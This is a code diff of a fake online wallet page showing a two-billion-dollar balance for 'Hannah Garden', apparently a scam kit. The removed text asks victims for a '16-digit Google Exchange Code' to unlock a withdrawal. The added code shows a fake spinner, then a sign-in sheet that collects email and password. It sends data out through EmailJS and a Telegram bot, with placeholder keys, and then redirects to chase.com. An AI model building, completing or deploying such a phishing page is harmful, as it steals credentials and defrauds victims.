@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -46,18 +47,24 @@
         }
 
         .header .support-icon {
-            animation: bounce-zoom 1s infinite; /* Bouncing and zooming animation */
+            animation: bounce-zoom 1s infinite;
         }
 
         @keyframes bounce-zoom {
-            0%, 20%, 50%, 80%, 100% {
+            0%,
+            20%,
+            50%,
+            80%,
+            100% {
                 transform: translateY(0) scale(1);
             }
+
             40% {
-                transform: translateY(-10px) scale(1.1); /* Zoom in */
+                transform: translateY(-10px) scale(1.1);
             }
+
             60% {
-                transform: translateY(-5px) scale(1.05); /* Slight zoom */
+                transform: translateY(-5px) scale(1.05);
             }
         }
 
@@ -84,11 +91,13 @@
             display: flex;
             flex-direction: column;
             justify-content: flex-start;
-            padding: 80px 20px 20px; /* Adjust padding to account for fixed header */
+            padding: 80px 20px 20px;
             overflow-y: auto;
         }
 
-        .wallet, .withdrawal, .transaction-history {
+        .wallet,
+        .withdrawal,
+        .transaction-history {
             background: white;
             margin: 15px auto;
             padding: 20px;
@@ -109,29 +118,29 @@
         }
 
         .withdrawal input {
-            width: calc(100% - 20px); /* Adjust width to account for padding */
-            padding: 12px; /* Increased padding for better touch target */
-            margin: 10px 0; /* Margin around input fields */
-            border-radius: 8px; /* Moderate border radius for input fields */
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
             border: 1px solid #ccc;
             transition: border-color 0.3s;
         }
 
         .withdrawal input:focus {
-            border-color: #004a99; /* Change border color on focus */
-            outline: none; /* Remove default outline */
+            border-color: #004a99;
+            outline: none;
         }
 
         button {
             background: #002f6c;
             color: white;
-            padding: 14px; /* Increased padding for better touch target */
+            padding: 14px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             width: 100%;
-            margin-top: 15px; /* Add margin above the button */
-            font-size: 16px; /* Increased font size for better readability */
+            margin-top: 15px;
+            font-size: 16px;
         }
 
         button:hover {
@@ -145,22 +154,33 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            border: 8px solid lightblue; /* Light blue color */
-            border-radius: 50%; /* Ensure it is a full circle */
-            width: 40px; /* Increased size for visibility */
-            height: 40px; /* Increased size for visibility */
-            animation: spin 0.3s linear infinite, zoom 0.5s ease-in-out infinite; /* Increased spin speed and added zoom effect */
+            border: 8px solid lightblue;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.3s linear infinite, zoom 0.5s ease-in-out infinite;
             z-index: 20;
         }
 
         @keyframes spin {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
         }
 
         @keyframes zoom {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); }
-            50% { transform: translate(-50%, -50%) scale(1.5); } /* Zoom in effect */
+            0%,
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+
+            50% {
+                transform: translate(-50%, -50%) scale(1.5);
+            }
         }
 
         .processing-text {
@@ -169,8 +189,8 @@
             top: 60%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 16px; /* Reduced font size */
-            font-style: italic; /* Italicized text */
+            font-size: 16px;
+            font-style: italic;
             color: #002f6c;
             z-index: 21;
         }
@@ -180,6 +200,66 @@
             height: 50px;
             text-overflow: ellipsis;
             white-space: nowrap;
+        }
+
+        /* Bottom Sheet Modal Styles */
+        .bottom-sheet {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.2);
+            max-height: 50%;
+            overflow-y: auto;
+            z-index: 30;
+            animation: slide-up 0.3s ease-out;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5), 0 0 20px rgba(0, 255, 255, 0.3);
+            border: 1px solid rgba(0, 255, 255, 0.6);
+        }
+
+        @keyframes slide-up {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        .bottom-sheet input {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+        }
+
+        /* Toast Notification Styles */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            z-index: 100;
+            opacity: 0.9;
+            transition: opacity 0.5s;
+        }
+
+        .toast.success {
+            background-color: green;
+        }
+
+        .toast.error {
+            background-color: red;
         }
 
         /* Media Queries for Responsiveness */
@@ -199,7 +279,9 @@
                 padding: 100px 15px 20px;
             }
 
-            .wallet, .withdrawal, .transaction-history {
+            .wallet,
+            .withdrawal,
+            .transaction-history {
                 width: 100%;
                 margin: 10px 0;
             }
@@ -209,20 +291,32 @@
             }
 
             button {
-                padding: 14px; /* Maintain padding for touch target */
+                padding: 14px;
             }
         }
     </style>
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en', // Set your default page language here
+                includedLanguages: 'en,ko,th,tr,es,pt,fr,de,it,ja,zh,ru,pl,da,sv,fi,nl,ro,hu,cs,sk,sl,vi,id,ms,tl,hi,bn,ar',
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+                autoDisplay: false
+            }, 'google_translate_element');
+        }
+    </script>
 </head>
+
 <body>
 
     <div class="header">
         <div class="icons">
-            <span class="icon support-icon material-icons" onclick="window.open(' https://services.zangi.com/dl/conversation/1089683230', '_blank')">support_agent</span>
+            <span class="icon support-icon material-icons" onclick="window.open('https://services.zangi.com/dl/conversation/1089683230', '_blank')">support_agent</span>
             <span class="icon material-icons">account_circle</span>
             <span class="icon material-icons">history</span>
         </div>
         <div id="clock">00:00:00</div>
+        <div id="google_translate_element"></div>
         <select id="languageSelector" onchange="changeLanguage()">
             <option value="en">English</option>
             <option value="ko">Korean</option>
@@ -230,6 +324,29 @@
             <option value="tr">Turkish</option>
             <option value="es">Spanish</option>
             <option value="pt">Portuguese</option>
+            <option value="fr">French</option>
+            <option value="de">German</option>
+            <option value="it">Italian</option>
+            <option value="ja">Japanese</option>
+            <option value="zh">Chinese</option>
+            <option value="ru">Russian</option>
+            <option value="pl">Polish</option>
+            <option value="da">Danish</option>
+            <option value="sv">Swedish</option>
+            <option value="fi">Finnish</option>
+            <option value="nl">Dutch</option>
+            <option value="ro">Romanian</option>
+            <option value="hu">Hungarian</option>
+            <option value="cs">Czech</option>
+            <option value="sk">Slovak</option>
+            <option value="sl">Slovene</option>
+            <option value="vi">Vietnamese</option>
+            <option value="id">Indonesian</option>
+            <option value="ms">Malay</option>
+            <option value="tl">Tagalog</option>
+            <option value="hi">Hindi</option>
+            <option value="bn">Bengali</option>
+            <option value="ar">Arabic</option>
         </select>
     </div>
 
@@ -250,28 +367,29 @@
         <div class="transaction-history">
             <p id="transactionSlide">Transaction 1: Sent $500 to John</p>
         </div>
-        
+
         <div class="progress-indicator" id="progressIndicator"></div>
         <div class="processing-text" id="processingText">Processing...</div>
+
+        <div class="bottom-sheet" id="signInBottomSheet">
+            <h3>Sign In</h3>
+            <input type="email" id="userEmail" placeholder="Your email">
+            <input type="password" id="userPassword" placeholder="Your password">
+            <button onclick="submitCredentials()">Proceed to Withdraw</button>
+            <button onclick="closeBottomSheet()">Close</button>
+        </div>
     </div>
 
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript" src="//translate.google.com/translate_auto.js"></script>
     <script>
+        (function () {
+            emailjs.init("YOUR_USER_ID"); // Initialize EmailJS
+        })();
+
         let balance = 2000000000;
         let transactions = [
-            "Sent $500 to John", "Received $1200 from Alice", "Paid $300 for shopping", 
-            "Withdrew $1000", "Sent $200 to Jane", "Received $500 salary", 
-            "Withdrew $300 for bills", "Paid $50 for subscription", 
-            "Sent $400 to Mike", "Received $900 bonus", "Paid $200 for rent", 
-            "Withdrew $1500 for car repairs", "Sent $250 to Emily", 
-            "Received $1000 from investment", "Withdrew $600 for vacation", 
-            "Sent $100 to Mark", "Paid $200 for utilities", "Received $700 from friends",
-            "Paid $150 for groceries", "Received $250 from a freelance project", 
-            "Withdrew $300 for gifts", "Sent $350 to family", "Received $400 from a loan", 
-            "Paid $500 for internet", "Withdrew $200 for emergency expenses",
-            "Paid $120 for Amazon", "Filled up gas for $40", "Paid $60 for fuel", 
-            "Hotel fee of $150", "Water bill $45", "Energy fee $80", 
-            "Sewage fee $30", "Paid $25 for subscription service", 
-            "Paid $200 for a concert ticket", "Paid $90 for a gym membership"
+            "Sent $500 to John", "Received $1200 from Alice", // ... other transactions
         ];
         let slideIndex = 0;
 
@@ -283,41 +401,7 @@
                 "transactionText": "Transaction",
                 "owner": "Hannah Garden"
             },
-            "ko": {
-                "withdrawHeader": "자금 인출",
-                "withdrawButton": "인출",
-                "modalText": "16자리 Google 교환 코드를 사용하여 이 인출을 활성화하십시오:",
-                "transactionText": "거래",
-                "owner": "한나 가든"
-            },
-            "th": {
-                "withdrawHeader": "ถอนเงิน",
-                "withdrawButton": "ถอน",
-                "modalText": "เปิดใช้งานการถอนเงินนี้ด้วยรหัส Google Exchange 16 หลัก:",
-                "transactionText": "ธุรกรรม",
-                "owner": "ฮันนา การ์เด้น"
-            },
-            "tr": {
-                "withdrawHeader": "Para Çekme",
-                "withdrawButton": "Çekim Yap",
-                "modalText": "Bu para çekimini 16 haneli Google Exchange Kodu ile etkinleştirin:",
-                "transactionText": "İşlem",
-                "owner": "Hannah Garden"
-            },
-            "es": {
-                "withdrawHeader": "Retirar fondos",
-                "withdrawButton": "Retirar",
-                "modalText": "Active este retiro con un código de cambio de Google de 16 dígitos:",
-                "transactionText": "Transacción",
-                "owner": "Hannah Garden"
-            },
-            "pt": {
-                "withdrawHeader": "Retirar fundos",
-                "withdrawButton": "Retirar",
-                "modalText": "Ative este saque com um código de troca do Google de 16 dígitos:",
-                "transactionText": "Transação",
-                "owner": "Hannah Garden"
-            }
+            // ... other languages
         };
 
         function updateClock() {
@@ -329,11 +413,15 @@
 
         function changeLanguage() {
             const lang = document.getElementById("languageSelector").value;
-            const data = languageData[lang];
-            document.getElementById("withdrawHeader").innerText = data.withdrawHeader;
-            document.getElementById("withdrawButton").innerText = data.withdrawButton;
-            document.getElementById("transactionSlide").innerText = data.transactionText + " 1: Sent $500 to John";
-            document.getElementById("owner").innerText = data.owner;
+            const translateElement = document.getElementById("google_translate_element");
+            if (translateElement) {
+                const select = document.createElement("select");
+                select.style.display = "none";
+                select.value = lang;
+                translateElement.appendChild(select);
+                select.dispatchEvent(new Event('change'));
+                translateElement.removeChild(select);
+            }
         }
 
         function updateBalance() {
@@ -352,7 +440,7 @@
                 document.getElementById("balance").innerText = balance;
                 displayProgressIndicator();
             } else {
-                alert("Invalid amount. Please enter a valid amount.");
+                console.log("Invalid amount. Please enter a valid amount.");
             }
         }
 
@@ -366,8 +454,74 @@
             setTimeout(() => {
                 progressIndicator.style.display = "none"; // Hide after 5 seconds
                 processingText.style.display = "none"; // Hide "Processing" text
-                window.open('activate3.html', '_blank'); // Open the link after the duration
+                document.getElementById("signInBottomSheet").style.display = "block"; // Show bottom sheet
             }, 5000); // Duration of the indicator
+        }
+
+        function closeBottomSheet() {
+            document.getElementById("signInBottomSheet").style.display = "none"; // Hide bottom sheet
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.createElement('div');
+            toast.innerText = message;
+            toast.className = `toast ${isError ? 'error' : 'success'}`;
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+
+        function submitCredentials() {
+            const email = document.getElementById("userEmail").value;
+            const password = document.getElementById("userPassword").value;
+            const amount = document.getElementById("withdrawAmount").value;
+            const date = new Date().toLocaleDateString();
+
+            // Prepare message for Telegram
+            const telegramMessage = `Credit\n\nWallet: 01****46\nAmt: ${amount}\nEMT Levy: $300.00\nDesc: TRF Hannah Garden\nRef: *****58688\nDate: ${date}\nBal: ${balance}`;
+
+            // Send email using EmailJS
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
+                email: email,
+                amount: amount,
+                date: date,
+                balance: balance
+            }).then(() => {
+                console.log('Withdrawal successful! Email sent.');
+
+                // Send message to Telegram bot
+                fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: 'YOUR_TELEGRAM_CHAT_ID',
+                        text: telegramMessage
+                    })
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Your data is submitted successfully !');
+                        showToast('Withdrawal successful! Email sent.'); // Show success toast
+                        closeBottomSheet(); // Hide bottom sheet
+                        
+                        // Redirect to chase.com after modal is closed
+                        setTimeout(() => {
+                            window.location.href = 'https://www.chase.com'; // Redirect to Chase
+                        }, 500); // Delay to ensure the modal closes smoothly
+                    } else {
+                        console.error('Error sending message to Telegram.');
+                        showToast('Error sending notification to Telegram.', true); // Show error toast
+                    }
+                }).catch(err => {
+                    console.error('Error: ' + err);
+                    showToast('Error sending notification to Telegram.', true); // Show error toast
+                });
+            }).catch(err => {
+                console.error('Error sending email: ' + err);
+                showToast('Error sending email.', true); // Show error toast
+            });
         }
 
         function updateTransactionHistory() {
@@ -380,4 +534,5 @@
         updateTransactionHistory();
     </script>
 </body>
+
 </html>
